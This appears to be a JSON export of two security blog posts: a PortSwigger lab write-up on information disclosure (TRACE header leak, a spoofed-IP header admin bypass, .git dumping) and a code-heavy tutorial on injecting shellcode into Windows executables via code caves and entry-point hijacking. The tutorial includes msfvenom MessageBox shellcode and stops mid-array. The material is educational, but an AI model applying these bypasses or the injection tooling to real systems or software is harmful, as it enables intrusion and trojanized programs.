[ { "title": "PortSwigger Academy - Information Disclosure", "url": "/posts/portswigger-information-disclosure/", "categories": "Web App Security, Web CTF", "tags": "ctf, information-disclosure, error-handling, debugging, git-exposure", "date": "2026-01-17 14:10:00 +0700", "content": "Introduction Information disclosure vulnerabilities occur when applications unintentionally expose sensitive data to users. This can include technical details like software versions, internal paths, database credentials, or business-sensitive information. These vulnerabilities often arise from verbose error messages, debug pages, backup files, or misconfigured version control systems. While information disclosure alone might not directly compromise a system, it provides attackers with valuable reconnaissance data to craft more targeted attacks. This writeup covers five labs from PortSwigger Academy’s Information Disclosure module, demonstrating how leaked information leads to authentication bypass and credential exposure. Lab Overview Lab Difficulty Vulnerability Lab 1 Apprentice Verbose error messages Lab 2 Apprentice Debug page exposure Lab 3 Apprentice Backup file disclosure Lab 4 Apprentice HTTP method misconfiguration Lab 5 Practitioner Git repository exposure Lab 1: Information disclosure in error messages Difficulty: Apprentice Link: Lab - Information disclosure in error messages Lab description: This lab’s verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework. Solution: I started by running a crawl scan (without audit). Right-click → New scan → select Crawl as scan type. Configuring crawl scan After completion, the dashboard showed crawl results. Several endpoints had query parameters like /product?productId=2 Endpoints with query parameters I sent the request to Repeater and triggered an error by adding ': GET /product?productId=2' HTTP/2 Host: [lab-id].web-security-academy.net This returned a 500 Internal Server Error with a stack trace revealing Apache Struts 2 2.3.31. Version disclosure in error message Submitted 2 2.3.31 as the flag and solved the lab. Lab 2: Information disclosure on debug page Difficulty: Apprentice Link: Lab - Information disclosure on debug page Lab description: This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable. Solution: Running the same crawl scan revealed /cgi-bin/phpinfo.php. Debug page exposed The page contained SECRET_KEY in PHP Variables $_SERVER['SECRET_KEY'] with value zxnk4qzn64okinervdce8v9r7inwnjd3. Environment variable exposed Submitted the secret key as flag and solved the lab. Lab 3: Source code disclosure via backup files Difficulty: Apprentice Link: Lab - Source code disclosure via backup files Lab description: This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code. Solution: Crawl scan discovered robots.txt, /backup and /backup/ProductTemplate.java.bak. Backup directory discovered Contents of robots.txt: User-agent: * Disallow: /backup The crawler found /backup from this file. Accessing /backup showed directory listing with ProductTemplate.java.bak. Backup file exposed Found hardcoded password in /backup/ProductTemplate.java.bak: 966yj4yg30h7wcte4dnyskc73xuolkpj Database password in source code Submitted the password as flag and solved the lab. Lab 4: Authentication bypass via information disclosure Difficulty: Apprentice Link: Lab - Authentication bypass via information disclosure Lab description: This lab’s administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end. To solve the lab, obtain the header name then use it to bypass the lab’s authentication. Access the admin interface and delete the user carlos. You can log in to your own account using the following credentials: wiener:peter Tip: When credentials are provided, use them to focus on the intended solution. Admin pages in PortSwigger Academy are typically at /admin. Solution: Logged in as wiener:peter. Accessing /admin returned 401 Unauthorized. Admin panel inaccessible In Repeater, I changed the method to TRACE: TRACE /admin HTTP/2 Host: [lab-id].web-security-academy.net Cookie: session=ZakynhQJxmlM8wjYyoEHTL8krx6cS7vD The response revealed header X-Custom-IP-Authorization: 114.10.45.25: Custom header exposed via TRACE I guessed the application validates IP based on this header and whitelists localhost (127.0.0.1): GET /admin HTTP/2 Host: [lab-id].web-security-academy.net Cookie: session=ZakynhQJxmlM8wjYyoEHTL8krx6cS7vD X-Custom-Ip-Authorization: 127.0.0.1 Successfully bypassed! Successfully accessed admin panel Accessed /admin/delete?username=carlos to delete user carlos: GET /admin/delete?username=carlos HTTP/2 Host: [lab-id].web-security-academy.net Cookie: session=ZakynhQJxmlM8wjYyoEHTL8krx6cS7vD X-Custom-Ip-Authorization: 127.0.0.1 User carlos deleted successfully Lab solved. Info: The TRACE method is an HTTP debugging feature that echoes back the exact request received by the server, including all headers. This can expose internal headers added by proxies or load balancers. When enabled, attackers can discover custom authentication headers or other security-related information not visible in normal requests. Learn more: WSTG-CONF-06, Acunetix - HTTP Security, TRACE Method Vulnerability. Lab 5: Information disclosure in version control history Difficulty: Practitioner Link: Lab - Information disclosure in version control history Lab description: This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos. Solution: The crawler found nothing. I used dirsearch for fuzzing: dirsearch -u https://[lab-id].web-security-academy.net/ Found /.git/! Git directory exposed I used git-dumper to download the repository: git-dumper https://[lab-id].web-security-academy.net/.git ./output For analyzing commit history, I used tig: sudo apt install tig cd output tig . Git commit history In commit 716e35def03ce384f44fc9e180be7faad73e6698, file admin.conf originally contained: ADMIN_PASSWORD=qdp530wezwrw81wkut0z Then changed to: ADMIN_PASSWORD=env('ADMIN_PASSWORD') Logged in using administrator:qdp530wezwrw81wkut0z and deleted user carlos. Lab solved. Conclusion These labs demonstrated how information disclosure—through error messages, debug pages, backup files, HTTP misconfigurations, and exposed version control—provides attackers with reconnaissance data for targeted attacks. Always disable verbose errors, remove debug endpoints, secure backup files, disable unnecessary HTTP methods, and protect version control directories in production environments." }, { "title": "Binary Injection in Windows Applications", "url": "/posts/binary-injection-in-windows-app/", "categories": "Windows App Security, WinApp Techniques", "tags": "binary-injection, pe-analysis, code-injection, windows", "date": "2026-01-11 15:12:00 +0700", "content": "Introduction Binary injection is a technique that hides malicious code inside legitimate executables. This article demonstrates two injection methods: Code cave injection - Injecting code into existing empty space within executables Section addition - Creating new executable sections to hold malicious payloads We’ll use a custom Calculator application to show how these attacks work in practice. Disclaimer: This content is for educational purposes only. Use these techniques responsibly and only on systems you own or have explicit permission to test. Why Binary Injection Matters In our previous article on code signing, we demonstrated basic binary modification by patching text strings. This article explores advanced modification techniques through binary injection. Binary injection enables: Supply chain attacks - Compromised installers containing hidden malware Trojanized applications - Legitimate programs repackaged with backdoors Persistence mechanisms - Modified system utilities maintaining access Privilege escalation - Injected code inheriting application permissions Understanding these techniques is critical for security professionals in both offensive testing and defensive analysis. According to OWASP Desktop App Security Top 10, lack of integrity verification (DA8 - Poor Code Quality) enables these attacks. Test Application Setup We’ll use a custom Calculator application for this demonstration: #include &lt;iostream&gt; using namespace std; // IMPORTANT: These dummy functions create empty space (padding) in the compiled program. // We call them to prevent compiler optimization from removing them. // This padding creates \"code caves\" which we'll use for injection in Part 2. // Don't worry about understanding this now - we'll explain why this matters later! void dummy1() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } void dummy2() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } void dummy3() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } void dummy4() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } void dummy5() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } int add(int a, int b) { return a + b; } int subtract(int a, int b) { return a - b; } int multiply(int a, int b) { return a * b; } int divide(int a, int b) { if(b == 0) { cout &lt;&lt; \"Error: Division by zero!\\n\"; return 0; } return a / b; } void printMenu() { cout &lt;&lt; \"\\n=================================\\n\"; cout &lt;&lt; \" Simple Calculator\\n\"; cout &lt;&lt; \"=================================\\n\"; cout &lt;&lt; \"1. Add\\n\"; cout &lt;&lt; \"2. Subtract\\n\"; cout &lt;&lt; \"3. Multiply\\n\"; cout &lt;&lt; \"4. Divide\\n\"; cout &lt;&lt; \"5. Exit\\n\"; cout &lt;&lt; \"=================================\\n\"; } int main() { // Call dummy functions to create padding // (We'll explain why this is important in Part 2) dummy1(); dummy2(); dummy3(); dummy4(); dummy5(); int choice, num1, num2; while(true) { printMenu(); cout &lt;&lt; \"Enter choice (1-5): \"; cin &gt;&gt; choice; if(choice == 5) { cout &lt;&lt; \"Goodbye!\\n\"; break; } if(choice &lt; 1 || choice &gt; 4) { cout &lt;&lt; \"Invalid choice!\\n\"; continue; } cout &lt;&lt; \"Enter first number: \"; cin &gt;&gt; num1; cout &lt;&lt; \"Enter second number: \"; cin &gt;&gt; num2; switch(choice) { case 1: cout &lt;&lt; \"Result: \" &lt;&lt; add(num1, num2) &lt;&lt; \"\\n\"; break; case 2: cout &lt;&lt; \"Result: \" &lt;&lt; subtract(num1, num2) &lt;&lt; \"\\n\"; break; case 3: cout &lt;&lt; \"Result: \" &lt;&lt; multiply(num1, num2) &lt;&lt; \"\\n\"; break; case 4: if(num2 != 0) cout &lt;&lt; \"Result: \" &lt;&lt; divide(num1, num2) &lt;&lt; \"\\n\"; break; } } return 0; } Build it as x64 Release in Visual Studio. The executable will be at x64\\Release\\Calculator.exe. Calculator application running Demonstration: Code Cave Method Understanding PE Files What is a PE File? PE stands for Portable Executable - the format Windows uses for programs: .exe files (applications like our Calculator.exe) .dll files (libraries) .sys files (drivers) Think of a PE file like a cookbook: Cookbook (PE File) │ ├── Cover Page (DOS Header) │ └── Says \"This is a cookbook\" (file signature) │ ├── Table of Contents (PE Headers) │ ├── Author information │ ├── Publication date │ └── Start reading at page 5 ← This is the \"Entry Point\" │ ├── Index (Section Table) │ ├── Chapter 1: Recipes (pages 5-20) ← Code Section │ ├── Chapter 2: Ingredients List (pages 21-25) ← Data Section │ └── Chapter 3: Photos (pages 26-30) ← Resources │ └── Content (Sections) ├── Chapter 1: Step-by-step cooking instructions ├── Chapter 2: List of ingredients needed └── Chapter 3: Pictures of finished dishes Key Concepts: Entry Point - Where the program starts (like “start reading at page 5”) Sections - Different parts of the program (like chapters) Code Section (.text) - The actual instructions the computer follows Data Section (.rdata, .data) - Information the program uses (text, numbers, etc.) Analyzing Our Calculator.exe Let’s examine our Calculator program using Python. First, we need to understand what we’re looking for. When we analyze a PE file, we want to know: Where does the program start? (Entry Point) What sections does it have? Which sections contain executable code? Here’s our analysis script: import pefile import sys # ANSI Color codes for terminal output class Colors: HEADER = '\\033[95m' # Magenta BLUE = '\\033[94m' # Blue CYAN = '\\033[96m' # Cyan GREEN = '\\033[92m' # Green YELLOW = '\\033[93m' # Yellow RED = '\\033[91m' # Red BOLD = '\\033[1m' # Bold UNDERLINE = '\\033[4m' # Underline END = '\\033[0m' # Reset def analyze_pe(filename): \"\"\"Analyze PE file structure - shows what's inside an executable\"\"\" pe = pefile.PE(filename) print(f\"\\n{Colors.BOLD}{Colors.CYAN}=== Analyzing: {filename} ==={Colors.END}\\n\") # 1. Entry Point - where the program begins entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint print(f\"{Colors.BOLD}[1] Entry Point:{Colors.END} {Colors.GREEN}0x{entry_point:X}{Colors.END}\") print(f\" This is where the program starts executing\") print(f\" Like the cookbook saying 'start reading at page 5'\\n\") # 2. Sections - the different chapters print(f\"{Colors.BOLD}[2] Sections (Chapters):{Colors.END}\") print(f\" Total sections: {Colors.YELLOW}{pe.FILE_HEADER.NumberOfSections}{Colors.END}\\n\") for section in pe.sections: # Get section name (remove null padding) name = section.Name.decode().strip('\\x00') # Get section location and size virtual_address = section.VirtualAddress size = section.SizeOfRawData # Check if this section is executable # Characteristics is a flags field - each bit means something different # Reference: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags characteristics = section.Characteristics # Bit 0x20000000 (IMAGE_SCN_MEM_EXECUTE) = section can be executed as code is_executable = (characteristics &amp; 0x20000000) != 0 # Print section info with colors print(f\" {Colors.BOLD}{name:&lt;10}{Colors.END} at address {Colors.CYAN}0x{virtual_address:04X}{Colors.END}, size {Colors.YELLOW}{size:5}{Colors.END} bytes\") if is_executable: print(f\" {Colors.GREEN}^ This section contains EXECUTABLE CODE{Colors.END}\") print(f\" {Colors.GREEN}The CPU will run instructions from here{Colors.END}\") else: print(f\" {Colors.BLUE}^ This section contains DATA (not code){Colors.END}\") print(f\" {Colors.BLUE}Stores strings, numbers, or other information{Colors.END}\") print() pe.close() if __name__ == \"__main__\": if len(sys.argv) != 2: print(f\"{Colors.RED}Usage: {sys.argv[0]} &lt;filename.exe&gt;{Colors.END}\") print(f\"{Colors.YELLOW}Example: {sys.argv[0]} Calculator.exe{Colors.END}\") sys.exit(1) analyze_pe(sys.argv[1]) Understanding the Code: The key line is: is_executable = (characteristics &amp; 0x20000000) != 0 What does 0x20000000 mean? Each section has characteristics - a 32-bit number where each bit is a flag (like on/off switches). According to Microsoft’s PE Format documentation: Bit 0x20000000 = IMAGE_SCN_MEM_EXECUTE = “This section can be executed” Bit 0x40000000 = IMAGE_SCN_MEM_READ = “This section can be read” Bit 0x80000000 = IMAGE_SCN_MEM_WRITE = “This section can be written to” Example: If characteristics = 0xE0000020, in binary: 1110 0000 0000 0000 0000 0000 0010 0000 │││ │ ││└─ WRITE permission └─ CODE flag │└── READ permission └─── EXECUTE permission The &amp; (AND) operation checks if bit 0x20000000 is set: 0xE0000020 &amp; 0x20000000 = 0x20000000 # Not zero = executable 0x40000040 &amp; 0x20000000 = 0x00000000 # Zero = not executable Running the script: python3 analyze_pe.py Calculator.exe === Analyzing: Calculator.exe === [1] Entry Point: 0x18C0 This is where the program starts executing Like the cookbook saying 'start reading at page 5' [2] Sections (Chapters): Total sections: 6 .text at address 0x1000, size 5120 bytes ^ This section contains EXECUTABLE CODE The CPU will run instructions from here .rdata at address 0x3000, size 5120 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .data at address 0x5000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .pdata at address 0x6000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .rsrc at address 0x7000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .reloc at address 0x8000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information What we learned: The program starts at address 0x18C0 It has 6 sections (chapters) Only .text section is executable - this is where the actual program code lives Other sections contain data the program uses Now we understand the structure of our Calculator.exe. Let’s move on to finding spaces where we can inject code. Finding Code Caves What is a Code Cave? Imagine you’re reading a textbook and find several blank pages in the middle of a chapter. The publisher left these pages empty, perhaps for alignment or formatting reasons. A code cave is similar - it’s unused space (empty bytes) inside the executable section of a program. Why do code caves exist? Compilers sometimes add padding (empty space) for: Memory alignment (CPU works faster with aligned data) Section size requirements (sections often need to be multiples of certain sizes) Future updates (leaving room for patches) Analogy: Recipe Chapter (Executable Section): Page 1: Mix ingredients Page 2: Heat oven to 350°F Page 3: (BLANK) ← Code Cave! Page 4: (BLANK) ← Code Cave! Page 5: (BLANK) ← Code Cave! Page 6: Bake for 30 minutes An attacker can write their own “recipe” (malicious code) on those blank pages. Understanding Our Padding Functions Remember the dummy functions in Calculator.cpp? Now we can explain why they’re there. void dummy1() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } void dummy2() { volatile int x = 0; for(int i=0; i&lt;100; i++) x++; } // ... etc Why we need these: Without dummy functions: Modern compilers optimize aggressively, no wasted space, no code caves With dummy functions: Compiler allocates space for them, creating gaps between functions These gaps = Code caves we can use for injection This is intentional for our demonstration. Real-world programs might have caves from: Compiler optimizations Section alignment Removed/deprecated functions Debug information stripped Finding Code Caves Script Now let’s create a script to locate these empty spaces: import pefile import sys # ANSI Color codes class Colors: HEADER = '\\033[95m' BLUE = '\\033[94m' CYAN = '\\033[96m' GREEN = '\\033[92m' YELLOW = '\\033[93m' RED = '\\033[91m' BOLD = '\\033[1m' END = '\\033[0m' def find_code_caves(filename, min_size=50): \"\"\" Find code caves (empty space) in executable sections A code cave is continuous null bytes (0x00) in an executable section. We look for at least min_size consecutive zeros. \"\"\" pe = pefile.PE(filename) print(f\"\\n{Colors.BOLD}{Colors.CYAN}=== Code Cave Hunter ==={Colors.END}\") print(f\"{Colors.BOLD}Searching in:{Colors.END} {Colors.YELLOW}{filename}{Colors.END}\") print(f\"{Colors.BOLD}Looking for caves with minimum{Colors.END} {Colors.GREEN}{min_size}{Colors.END} {Colors.BOLD}bytes{Colors.END}\\n\") caves_found = 0 # Loop through all sections for section in pe.sections: # Get section name name = section.Name.decode().strip('\\x00') # We only care about executable sections is_executable = (section.Characteristics &amp; 0x20000000) != 0 if not is_executable: continue print(f\"{Colors.BOLD}[*] Scanning section:{Colors.END} {Colors.CYAN}{name}{Colors.END}\") # Get the raw bytes of this section section_data = section.get_data() # Now we scan byte-by-byte looking for consecutive zeros cave_start_position = None cave_size = 0 for position, byte_value in enumerate(section_data): # If we find a zero byte if byte_value == 0x00: if cave_start_position is None: cave_start_position = position cave_size += 1 # If we find a non-zero byte else: # Did we just finish a cave? if cave_size &gt;= min_size: # Calculate addresses cave_rva = section.VirtualAddress + cave_start_position cave_raw = section.PointerToRawData + cave_start_position print(f\" {Colors.GREEN}{Colors.BOLD}✓ Found cave!{Colors.END}\") print(f\" {Colors.BOLD}Location (RVA):{Colors.END} {Colors.CYAN}0x{cave_rva:X}{Colors.END}\") print(f\" {Colors.BOLD}Size:{Colors.END} {Colors.YELLOW}{cave_size}{Colors.END} {Colors.BOLD}bytes{Colors.END}\") print(f\" {Colors.BOLD}File offset:{Colors.END} {Colors.HEADER}0x{cave_raw:X}{Colors.END}\") print(f\" {Colors.BLUE}^ This is {cave_size} consecutive zero bytes{Colors.END}\") print(f\" {Colors.BLUE}^ We can write our code here!{Colors.END}\\n\") caves_found += 1 # Reset for next potential cave cave_start_position = None cave_size = 0 # Don't forget to check if section ended with a cave if cave_size &gt;= min_size: cave_rva = section.VirtualAddress + cave_start_position cave_raw = section.PointerToRawData + cave_start_position print(f\" {Colors.GREEN}{Colors.BOLD}✓ Found cave!{Colors.END}\") print(f\" {Colors.BOLD}Location (RVA):{Colors.END} {Colors.CYAN}0x{cave_rva:X}{Colors.END}\") print(f\" {Colors.BOLD}Size:{Colors.END} {Colors.YELLOW}{cave_size}{Colors.END} {Colors.BOLD}bytes{Colors.END}\") print(f\" {Colors.BOLD}File offset:{Colors.END} {Colors.HEADER}0x{cave_raw:X}{Colors.END}\\n\") caves_found += 1 print(f\"{Colors.BOLD}Total caves found:{Colors.END} {Colors.GREEN if caves_found &gt; 0 else Colors.RED}{caves_found}{Colors.END}\") if caves_found == 0: print(f\"\\n{Colors.YELLOW}No caves found. This means:{Colors.END}\") print(f\" - The compiler optimized well (no wasted space)\") print(f\" - Or caves are smaller than minimum size\") print(f\" {Colors.CYAN}Try running with smaller min_size:{Colors.END} python {sys.argv[0]} {filename} 20\") print() pe.close() if __name__ == \"__main__\": if len(sys.argv) &lt; 2: print(f\"{Colors.RED}Usage: {sys.argv[0]} &lt;filename.exe&gt; [min_size]{Colors.END}\") print(f\"\\n{Colors.YELLOW}Examples:{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe 100{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe 300{Colors.END}\") sys.exit(1) filename = sys.argv[1] min_size = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 50 find_code_caves(filename, min_size) Running the script: python3 find_caves.py Calculator.exe 300 === Code Cave Hunter === Searching in: Calculator.exe Looking for caves with minimum 300 bytes [*] Scanning section: .text ✓ Found cave! Location (RVA): 0x2239 Size: 455 bytes File offset: 0x1639 Total caves found: 1 What this means: We found a cave of 455 empty bytes at address 0x2239. This is enough space to inject a small payload (like showing a MessageBox). Visual representation: .text section (executable code): Address 0x1000: [Actual program code] Address 0x1500: [More program code] Address 0x2239: [000000000000...] ← 455 empty bytes (CODE CAVE!) Address 0x2500: [Actual program code continues] Perfect! We have a cave big enough for our injection. Next, we’ll learn how to write code into this space. Injecting Payload Understanding NOP (No Operation) NOP is the simplest CPU instruction. It means: “Do nothing, move to next instruction.” Analogy: Recipe: 1. Preheat oven 2. (skip this step) ← This is like NOP 3. (skip this step) ← This is like NOP 4. Mix ingredients In machine code: NOP = 0x90 (one byte) When CPU sees 0x90, it does nothing and continues Why use NOP for testing? Harmless (won’t crash the program) Easy to identify (just one byte: 90) Proves injection works (we can see it in debugger) Understanding JMP (Jump) JMP tells the CPU: “Stop reading here, jump to another address.” Analogy: Recipe Book: Page 10: Mix flour and sugar Page 11: [JUMP TO PAGE 50] ← JMP instruction Page 12: (this page is skipped) ... Page 50: Add eggs and milk ← CPU continues here In machine code: JMP = 0xE9 XX XX XX XX (5 bytes total) First byte E9 = JMP opcode Next 4 bytes = where to jump (offset) Why do we need JMP? After our injected code runs, we need to jump back to the original program. Without JMP, the program would crash. The Injection Plan Here’s what we’re going to do: # BEFORE injection: Program starts → Entry Point (0x18C0) → Calculator code → Exit # AFTER injection: Program starts → Entry Point (NEW: 0x2239) → Our code (NOP + JMP) → Jump to (0x18C0) → Calculator code → Exit Step by step: Write our code (5 NOPs + JMP) into the code cave at 0x2239 Change the Entry Point from 0x18C0 to 0x2239 Calculate JMP offset to jump back to 0x18C0 Calculating JMP Offset This is the tricky part. JMP uses relative addressing - it doesn’t jump to an absolute address, but to an offset from current position. Formula: Offset = Target Address - (Current Address + 5) Why + 5? Because the JMP instruction itself is 5 bytes long. The CPU calculates from the byte AFTER the JMP instruction. Example: We are at: 0x2239 (start of code cave) We write: 5 NOPs (5 bytes) + JMP (5 bytes) = 10 bytes total JMP position: 0x2239 + 5 = 0x223E We want to jump to: 0x18C0 (original entry point) Offset = 0x18C0 - (0x223E + 5) = 0x18C0 - 0x2243 = 0xFFFFF67D (negative number) Why negative? Because we’re jumping backwards in memory (from 0x2239 to 0x18C0). Simple Injection Script Now let’s write a script to inject 5 NOPs + JMP: import pefile import struct import sys # ANSI Color codes class Colors: HEADER = '\\033[95m' BLUE = '\\033[94m' CYAN = '\\033[96m' GREEN = '\\033[92m' YELLOW = '\\033[93m' RED = '\\033[91m' BOLD = '\\033[1m' END = '\\033[0m' def simple_injection(input_file, output_file, cave_rva, cave_raw): \"\"\" Simple code injection: 5 NOPs + JMP back to original entry This is a harmless test to prove injection works. The program will execute our 5 NOPs then continue normally. \"\"\" pe = pefile.PE(input_file) print(f\"\\n{Colors.BOLD}{Colors.CYAN}=== Simple Code Injection ==={Colors.END}\\n\") # Get original entry point original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint print(f\"{Colors.BOLD}[Step 1]{Colors.END} Original entry point: {Colors.GREEN}0x{original_entry:X}{Colors.END}\") print(f\" Program currently starts here\\n\") print(f\"{Colors.BOLD}[Step 2]{Colors.END} Code cave location: {Colors.CYAN}0x{cave_rva:X}{Colors.END}\") print(f\" This is where we'll write our code\\n\") # Build shellcode: 5 NOPs shellcode = b'\\x90' * 5 print(f\"{Colors.BOLD}[Step 3]{Colors.END} Our code: {Colors.YELLOW}5 NOP instructions{Colors.END}\") print(f\" In hex: {Colors.HEADER}{shellcode.hex()}{Colors.END}\") print(f\" Each 90 = NOP (do nothing)\\n\") # Calculate JMP offset jmp_from = cave_rva + 5 jmp_to = original_entry offset = jmp_to - (jmp_from + 5) print(f\"{Colors.BOLD}[Step 4]{Colors.END} Calculating JMP offset:\") print(f\" JMP from: {Colors.CYAN}0x{jmp_from:X}{Colors.END} (after our NOPs)\") print(f\" JMP to: {Colors.GREEN}0x{jmp_to:X}{Colors.END} (original entry)\") print(f\" Formula: {hex(jmp_to)} - ({hex(jmp_from)} + 5)\") print(f\" Offset: {Colors.YELLOW}{offset}{Colors.END} ({Colors.HEADER}{hex(offset &amp; 0xFFFFFFFF)}{Colors.END})\\n\") # Add JMP instruction shellcode += b'\\xE9' shellcode += struct.pack('&lt;i', offset) print(f\"{Colors.BOLD}[Step 5]{Colors.END} Complete code:\") print(f\" {Colors.HEADER}{shellcode.hex()}{Colors.END}\") print(f\" {Colors.YELLOW}^ 90 90 90 90 90{Colors.END} = 5 NOPs\") print(f\" {Colors.YELLOW}^ E9 XX XX XX XX{Colors.END} = JMP with offset\\n\") # Write to file print(f\"{Colors.BOLD}[Step 6]{Colors.END} Writing to file offset {Colors.CYAN}0x{cave_raw:X}{Colors.END}\") pe.set_bytes_at_offset(cave_raw, shellcode) print(f\" {Colors.GREEN}Wrote {len(shellcode)} bytes{Colors.END}\\n\") # Change entry point print(f\"{Colors.BOLD}[Step 7]{Colors.END} Changing entry point:\") print(f\" Old: {Colors.RED}0x{original_entry:X}{Colors.END}\") print(f\" New: {Colors.GREEN}0x{cave_rva:X}{Colors.END}\") pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave_rva print(f\" {Colors.GREEN}Now program starts at our code!{Colors.END}\\n\") # Save pe.write(output_file) pe.close() print(f\"{Colors.BOLD}{Colors.GREEN}[Success]{Colors.END} Saved as: {Colors.YELLOW}{output_file}{Colors.END}\") print(f\"\\n{Colors.BOLD}What happens when you run it:{Colors.END}\") print(f\" 1. Program starts at {Colors.CYAN}0x{cave_rva:X}{Colors.END} (our code)\") print(f\" 2. Executes 5 NOPs (does nothing 5 times)\") print(f\" 3. JMP to {Colors.GREEN}0x{original_entry:X}{Colors.END} (original code)\") print(f\" 4. Calculator runs normally\") print(f\"\\n{Colors.BLUE}The user won't notice anything different!{Colors.END}\\n\") if __name__ == \"__main__\": if len(sys.argv) != 5: print(f\"{Colors.RED}Usage: {sys.argv[0]} &lt;input.exe&gt; &lt;output.exe&gt; &lt;cave_rva&gt; &lt;cave_raw&gt;{Colors.END}\") print(f\"\\n{Colors.YELLOW}Example:{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe Calc_injected.exe 0x2239 0x1639{Colors.END}\") print(f\"\\n{Colors.YELLOW}How to get cave_rva and cave_raw:{Colors.END}\") print(f\" Run: {Colors.CYAN}python find_caves.py Calculator.exe{Colors.END}\") print(f\" Use the RVA and file offset values from the output\") sys.exit(1) simple_injection(sys.argv[1], sys.argv[2], int(sys.argv[3], 16), int(sys.argv[4], 16)) Running the script: python3 inject_simple.py Calculator.exe Calculator_test.exe 0x2239 0x1639 === Simple Code Injection === [Step 1] Original entry point: 0x18C0 Program currently starts here [Step 2] Code cave location: 0x2239 This is where we'll write our code [Step 3] Our code: 5 NOP instructions In hex: 9090909090 Each 90 = NOP (do nothing) [Step 4] Calculating JMP offset: JMP from: 0x223E (after our NOPs) JMP to: 0x18C0 (original entry) Formula: 0x18c0 - (0x223e + 5) Offset: -2435 (0xfffff67d) [Step 5] Complete code: 9090909090e97df6ffff ^ 90 90 90 90 90 = 5 NOPs ^ E9 XX XX XX XX = JMP with offset [Step 6] Writing to file offset 0x1639 Wrote 10 bytes [Step 7] Changing entry point: Old: 0x18C0 New: 0x2239 Now program starts at our code! [Success] Saved as: Calculator_test.exe What happens when you run it: 1. Program starts at 0x2239 (our code) 2. Executes 5 NOPs (does nothing 5 times) 3. JMP to 0x18C0 (original code) 4. Calculator runs normally The user won't notice anything different! Testing: Run the injected program: PS &gt; Calculator_test.exe The calculator functions normally after a simple injection. It works! The program runs normally, but it executed our 5 NOPs first. We successfully injected code! Generating the Payload We’ll use msfvenom (part of Metasploit Framework) to generate a MessageBox shellcode: msfvenom -p windows/x64/messagebox TITLE='Hacked!' TEXT='Code Injected!' ICON='INFORMATION' -f python This generates shellcode that: Calls Windows API MessageBoxA Shows a popup with title “Hacked!” and text “Code Injected!” Exits the process (we’ll fix this) The output will be Python code like: buf = b\"\" buf += b\"\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff...\" # ... many lines of shellcode Important: msfvenom adds ExitProcess at the end (last 6 bytes), which terminates the program. We need to remove these bytes and add our own JMP instead. The Complete Injection Script import pefile import struct import sys # ANSI Color codes class Colors: HEADER = '\\033[95m' BLUE = '\\033[94m' CYAN = '\\033[96m' GREEN = '\\033[92m' YELLOW = '\\033[93m' RED = '\\033[91m' BOLD = '\\033[1m' END = '\\033[0m' # Shellcode generated by msfvenom (ExitProcess removed - last 6 bytes) MESSAGEBOX_SHELLCODE = b\"\" MESSAGEBOX_SHELLCODE += b\"\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xcc\\x00\\x00\" MESSAGEBOX_SHELLCODE += b\"\\x00\\x41\\x51\\x41\\x50\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\" MESSAGEBOX_SHELLCODE += b\"\\x52\\x60\\x51\\x48\\x8b\\x52\\x18\\x56\\x48\\x8b\\x52\\x20\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\" MESSAGEBOX_SHELLCODE += b\"\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\" MESSAGEBOX_SHELLCODE += b\"\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\" MESSAGEBOX_SHELLCODE += b\"\\x41\\x51\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\" MESSAGEBOX_SHELLCODE += b\"\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48\" MESSAGEBOX_SHELLCODE += b\"\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\" MESSAGEBOX_SHELLCODE += b\"\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\" MESSAGEBOX_SHELLCODE += b\"\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\" MESSAGEBOX_SHELLCODE += b\"\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\" 